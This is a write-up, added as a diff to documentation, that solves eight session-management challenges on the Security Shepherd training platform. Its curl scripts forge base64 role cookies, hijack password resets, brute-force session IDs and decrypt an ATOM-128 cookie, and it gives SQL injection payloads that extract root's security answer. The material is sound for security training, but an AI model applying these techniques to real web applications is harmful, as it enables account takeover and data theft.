@@ -1,0 +1,317 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdSessionManagement:
+
+******************
+Session Management
+******************
+
+
+Session Management Challenge 1
+==============================
+
+This challenge involves modifying a cookie to get administrator access. Using Tamper Data on the :guilabel:`Administrator Only Button` button reveals a cookie "checksum=dXNlclJvbGU9dXNlcg==". Using ``echo -n "$checksum" | base64 -d`` its base64-decoded value is "userRole=user". The idea is to try other values: "admin" does not work but "administrator" does work. Here goes the :program:`curl` request returning the result key:
+
+.. code-block:: bash
+  :emphasize-lines: 6-8,14-16
+
+  # Tamper Data provides the URL, COOKIE, and POSTDATA.
+  # NOTE: POSTDATA is modified below.
+  URL='https://securityshepherd.com/challenges/dfd6bfba1033fa380e378299b6a998c759646bd8aea02511482b8ce5d707f93a'
+  COOKIE_BASE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  # change userRole cookie to base64 "userRole=administrator"
+  ROLE="$(echo -n "userRole=administrator" | base64)"
+  COOKIE="checksum=$ROLE; $COOKIE_BASE"
+
+  # Tamper Data provides POSTDATA model whose values are changed as below.
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode 'adminDetected=true' \
+       --data-urlencode 'returnPassword=true' \
+       --data-urlencode 'upgradeUserToAdmin=true' \
+       $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  Your result key is as follows
+  WSm0SScs3ZjJUvElMYU/7ywnTOdPiOSSkIsuUBETKvUM3UN9EU58n6/CK6slOUQDlr1tpWUTdWjBcck2flBILzJCp2qg0H78zPhZDMDITFc=
+
+
+Session Management Challenge 2
+==============================
+
+This challenge involves first using an error message to get an administrator's email account name, then exploiting the cookie from the prior session management challenge to reset an adminitrator's password, allowing logging on as the administrator.
+
+Clicking the :guilabel:`Have you forgotten your password?` button reveals a :guilabel:`Reset Password` button that needs an email address. Fortunately, the :guilabel:`Sign In` button has a nice error message echoing back the email address for bad password attempts. Trying several admin-like usernames revealed "root" = "elitehacker@shepherd.com", "admin" = "zoidberg22@shepherd.com", and "administrator" = "buzzthebald@shepherd.com". Of these 3 candidates for the :guilabel:`Reset Password` button we'll try "elitehacker@shepherd.com".
+
+Use Tamper Data to intercept the :guilabel:`Reset Password` request for "elitehacker@shepherd.com"; the request fails to reset the password. Remember the prior session management challenge used a "checksum" cookie with "userRole=administrator"; using that here results in resetting root's password which then allowed logging in as root and getting the result key. Here is the :program:`curl` exploit:
+
+.. code-block:: bash
+  :emphasize-lines: 7-8,11-13,17,27-28
+
+  # Tamper Data provides the URL, COOKIE, and POSTDATA (below).
+  SITE="https://securityshepherd.com"
+  URL_PWRESET="$SITE/challenges/f5ddc0ed2d30e597ebacf5fdd117083674b19bb92ffc3499121b9e6a12c92959"
+  URL_LOGIN="$SITE/challenges/d779e34a54172cbc245300d3bc22937090ebd3769466a501a5e7ac605b9f34b7"
+  COOKIE_BASE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  U="root"
+  EMAIL="elitehacker@shepherd.com"
+
+  # Password reset request for root/elitehacker@shepherd.com.
+  # Set userRole=administrator
+  ROLE="$(echo -n "userRole=administrator" | base64)"
+  COOKIE="checksum=$ROLE; $COOKIE_BASE"
+  PW=$(curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "subEmail=$EMAIL" \
+       $URL_PWRESET | \
+     sed -ne 's/^.*Changed to: \(-*[0-9]*\).*$/\1/p')
+  echo "Password is $PW"
+
+  # Login with the temporary password
+  COOKIE="$COOKIE_BASE"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "subName=$U" \
+       --data-urlencode "subPassword=$PW" \
+       $URL_LOGIN | \
+    sed -ne 's/^.*\(The result key is \)<a>\(.*\)<\/a>.*$/\1\2\n/p'
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  2V7A4hpcHWV57wXsdhcynpIlTa9oEbjdJg8AFIIkZYhWqd7mITE8KkX9qX8MQEj28QdeUeIuyYFT4Fpsx4HQ8RD8gjI0Ka5JlZ8vjWqkwUc=
+
+
+Session Management Challenge 3
+==============================
+
+This challenge involves tampering the cookie used by the :guilabel:`Change Password` function to identify the affected user. Tampering the cookie to root's user id allows logging in as root to get the result key.
+
+Clicking the :guilabel:`Toggle user functions` button reveals a :guilabel:`Change Password` functionality that doesn't require entering your user id. Using Tamper Data on the request reveals cookie "current=WjNWbGMzUXhNZz09". Running ``echo -n "WjNWbGMzUXhNZz09" | base64 | base64`` reveals the value "guest12". So perhaps using ``current=$(echo -n "root" | base64 | base64)`` will cause root's password to be reset. That is exactly what happens here:
+
+.. code-block:: bash
+  :emphasize-lines: 8-11,15,23-24
+
+  # Tamper Data provides the URL, COOKIE, and POSTDATA (below).
+  SITE="https://securityshepherd.com"
+  URL_PWRESET="$SITE/challenges/b467dbe3cd61babc0ec599fd0c67e359e6fe04e8cdc618d537808cbb693fee8a"
+  URL_LOGIN="$SITE/challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3"
+  COOKIE_BASE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  # Change cookie to root user, then reset password to "password".
+  U="root"
+  PASSWORD="password"
+  CURRENT="$(echo -n $U | base64 | base64)"
+  COOKIE="current=$CURRENT; $COOKIE_BASE"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "newPassword=$PASSWORD" \
+       $URL_PWRESET
+
+  # Login with the temporary password to reveal the result key.
+  COOKIE="$COOKIE_BASE"
+  curl --silent --insecure \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "subUserName=$U" \
+       --data-urlencode "subUserPassword=$PASSWORD" \
+       $URL_LOGIN | \
+    sed -ne 's/^.*\(The result key is \)<a>\(.*\)<\/a>.*$/\1\2\n/p'
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  W0XCm9DMsQLH8owbcmjBNmtBc05D/aOCRvGaNCpwYjFzRbBmD6tzi/QssSTXmCQcvLASW5SZ9kIWMp7dMVIHgZQcDLGVGUZwLXryoINaC7s=
+
+
+Session Management Challenge 4
+==============================
+
+This challenge involves tampering the cookie used by the :guilabel:`Admin Only Button` function to identify the session id. Tampering the cookie to an administrator's seesion allows getting access to the :guilabel:`Admin Only Button` function to get the result key.
+
+Using Tamper Data on the :guilabel:`Admin Only Button` reveals cookie "SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09". Running ``echo -n "TURBd01EQXdNREF3TURBd01EQXdNUT09" | base64 -d | base64 -d`` returns "0000000000000001". Perhaps by repeatedly trying different values start at "0000000000000000" may get access to :guilabel:`Admin Only Button`.
+
+.. code-block:: bash
+  :emphasize-lines: 8-9,11-13,17
+
+  # Tamper Data provides the URL, COOKIE, and POSTDATA (below).
+  SITE="https://securityshepherd.com"
+  URL="$SITE/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6"
+  COOKIE_BASE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  # Search for a subsession ID that is an admin:
+  for i in {0..99}; do
+    U="000000000000000$i"
+    U=${U:(-16)}
+    echo -e "\n\n *************** TRYING $U ***************** "
+    SUBSESSIONID=$(echo -n "$U" | base64 | base64)
+    SUBSESSIONID="${SUBSESSIONID%Cg==}"
+    COOKIE="SubSessionID=$SUBSESSIONID; $COOKIE_BASE"
+    RESULT=$(curl --silent --insecure  \
+         --header "X-Requested-With: XMLHttpRequest" \
+         --cookie "$COOKIE" \
+         --data-urlencode "userId=0000000000000001" \
+         --data-urlencode "useSecurity=true" \
+         "$URL")
+    if [[ ! "$RESULT" =~ "Your not an Admin" ]]; then
+      echo $RESULT
+      break;
+    fi
+  done
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-3
+
+  *************** TRYING 0000000000000021 ***************** 
+  Welcome administrator. Your result key is as follows
+  38k0w8iIAOIWhxN/AZYCm1sTIIWsTGgXzvbqEDeFT8EErGyPOPLzCosYCQVaMlhPeo78GBahLo6alDFkNS3DmHOISQhY2YeQ+gaRgpOBz4U=
+
+
+Session Management Challenge 5
+==============================
+
+This challenge involves finding a hidden "ChangePass" form and realizing that the required "resetPasswordToken" is a base64-encode ``date`` string.
+
+Using Firebug reveals not only the visible :guilabel:`Sign In` and :guilabel:`Send Email` buttons, but there's also a hidden "ChangePass" form that accepts three parameters: userName, newPassword, and resetPasswordToken. An inspection of the JavaScript is supposed to reveal that the resetPasswordToken is a base64-encoded ``date``. The following is a :program:`curl` exploit of this form. The only part that's easier to do from :program:`curl` is the hidden form.
+
+.. code-block:: bash
+  :emphasize-lines: 8-10,12-13,19,26-28,36-37
+
+  # Tamper Data provides the URL, COOKIE, and POSTDATA (below).
+  SITE="https://securityshepherd.com"
+  URL_SENDEMAIL="$SITE/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken"
+  URL_CHANGEPW="$SITE/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass"
+  URL_SIGNIN="$SITE/challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1"
+  COOKIE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  # Guess of an admin user.
+  U="admin"
+  PASSWORD="passwordpassword"
+
+  # Firebug shows JavaScript describing TOKEN
+  TOKEN="$(date | base64)"
+
+  # Get change password email
+  curl -v --insecure  \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "subUserName=$U" \
+       "$URL_SENDEMAIL"
+
+  # Change password form (requires token) - must do this via curl
+  curl --silent --insecure  \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "userName=$U" \
+       --data-urlencode "newPassword=$PASSWORD" \
+       --data-urlencode "resetPasswordToken=$TOKEN" \
+       "$URL_CHANGEPW"
+  # Gets output "Password change request success."
+
+  # Log in to get the result key. Can do this from web page
+  curl --silent --insecure  \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "subUserName=$U" \
+       --data-urlencode "subUserPassword=$PASSWORD" \
+       "$URL_SIGNIN"
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-3
+
+  Welcome admin
+  The result key is
+  grp4OqXe7zlJ5Y9tpznQanxOkwj86DINO52sdOJ4h+vihnR5c1Coov0xi4WLVPQoCLM5zrttsSvkSSpDaiSrCNTVCH/KJfZoNXQLayODt1I=
+
+
+Session Management Challenge 6
+==============================
+
+This challenge involves determining the answer to root's security question "What is the name of the place your wedding reception was held?". A SQL injection and good guess at the security question database column name is needed to get the answer.
+
+The web page is similar to Session Management Challenge 2: a failed attempt at logging into root gives root's email account "elitehacker@shepherd.com" which can be entered to find root's security question via :guilabel:`Get Security Question` button. It turns out that the email field is vulnerable to SQL injection but has number of restrictions that limit :program:`sqlmap`'s functionality. For example, the :guilabel:`Get Security Question` field must be between 10 - 75 characters and some :program:`sqlmap` queries to enumerate the columns require a longer query string.
+
+To prove there is a SQL injection enter ``"||1#xxxxx`` (5 x's to get it to 10 characters) to get the question "What is the first name of the person you first kissed?". To get the answer to the secret question we'll need a query like ``UNION SELECT answerColumn FROM answerTable WHERE userColumn = "root"`` (where we have to guess the column/table names). Note that this query is dangerously close to the 75 character limit.
+
+First we'll guess the table name. Hopefully it's in the same table as the user data so a guess of "users" is shown to be a valid table by ``"&&0 UNION SELECT 1 FROM users#`` returning the value 1.
+
+Next we guess the "userColumn", eventually getting success with "userName" as shown by ``"&&0 UNION SELECT 1 FROM users WHERE userName = 'root'#``.
+
+Finally we guess the answerColumn, trying all sorts of perturbations of "answer", "security", and "question". Eventually you may stumble into "secretAnswer" which is shown to work by ``"&&1 UNION SELECT secretAnswer FROM users WHERE userName = 'root'#`` returning "Deerburn Hotel". Entering "elitehacker@shepherd.com" in :guilabel:`Get Security Question` and "Deerburn Hotel" in the :guilabel:`Submit Answer` button returns the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-3
+
+  Welcome admin
+  The result key is
+  ix5LJUDsJGy7Ca8f1PmavdpJgIE6xLIuDfdAifeVsNtvDwRSqqDXxR3rMu1yrWZFtKDJoZzxki2ybulphtudF8xuOdLunRpzsXNZNET/j3h4eT+bRkMKQxEJsgBkK2ncbmcqhgkQiYRHOKv3xspeUQ==
+
+
+Session Management Challenge 7
+==============================
+
+Just like the previous session management challenge, try logging in as root to get the error message "Incorrect password for elitehacker@shepherd.com". Then enter "elitehacker@shepherd.com" in the :guilabel:`Get Security Question` to get the security question "What is your favourite flower?". Play around a bit more and realize that every user has the same security question. Now if they were like normally security-aware users the answer would have nothing to do with flowers. But here it is a flower and if you bother to scour the voluminous lists of flowers (I didn't) you might stumble into the answer "Franklin Tree". Entering that in :guilabel:`Submit Answer` gets the result key.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The result key is
+  CvsbVw3yj9EP0N60klYZGnM72AZ/fp6HYIV5bxU+tOOcavLKr0u/fOb/1a6W+GifYvNGVEzT75UFweLJKnpz+co6fAM3OH87gdqSw6xazlafBQI0DvOXOJkJjKI68udQnC/CYKzCyeWvXm/Kf4mT6A==
+
+
+Session Management Challenge 8
+==============================
+
+The easy part is recognizing that the cookie "challengeRole" needs to be modified to allow the :guilabel:`Priviledged User Only Button`. The hard part is figuring out the actual cipher used to allow guessing at the correct value needed.
+
+Using Tamper Data or Firebug shows the :guilabel:`Priviledged User Only Button` uses the new cookie "challengeRole" with value "LmH6nmbC". It's not base64-encoded, so what cipher could it be? One source of alternatives is http://crypo.in.ua/tools/ and try lots of them. If you tried ATOM-128 the string "LmH6nmbC" decrypts to "guest". This leads to trying "admin", "administrator", "root", ... . Eventually you may stumble on "superuser" (ATOM-128 encryption "nmHqLjQknlHs") which works:
+
+.. code-block:: bash
+  :emphasize-lines: 5-7,13-15
+
+  # Tamper Data provides URL, COOKIE, POSTDATA
+  URL='https://securityshepherd.com/challenges/714d8601c303bbef8b5cabab60b1060ac41f0d96f53b6ea54705bb1ea4316334'
+  COOKIE_BASE='JSESSIONID=06333C30B0859F9ECA464CAEAD86AA82; token=-118426698638160541217735682667848637549; JSESSIONID3="iuysOEpMSlZw8gEtl0o1UQ=="'
+
+  # "superuser"
+  CR="nmHqLjQknlHs"
+  COOKIE="challengeRole=$CR; $COOKIE_BASE"
+
+  curl -v --insecure  \
+       -X POST \
+       --header "X-Requested-With: XMLHttpRequest" \
+       --cookie "$COOKIE" \
+       --data-urlencode "returnUserRole=false" \
+       --data-urlencode "returnPassword=false" \
+       --data-urlencode "adminDetected=false" \
+       "$URL"
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1-3
+
+  Super User Only Club
+  Welcome super user! Your result key is as follows
+  Prm04JIV/SC4selS4AyxDL5a9LdXvQhpF1A8t2nJMhzT3K4hi+UMOjfJPziBGF3neD/4TmA1QCk9xqGksRpqrc/9rHetVhhrM7bToMabWRUJMwjrf2XJzDnqbZ+jaSE/zj1Vn7IdDUpvxeg3CCKo8w==
+
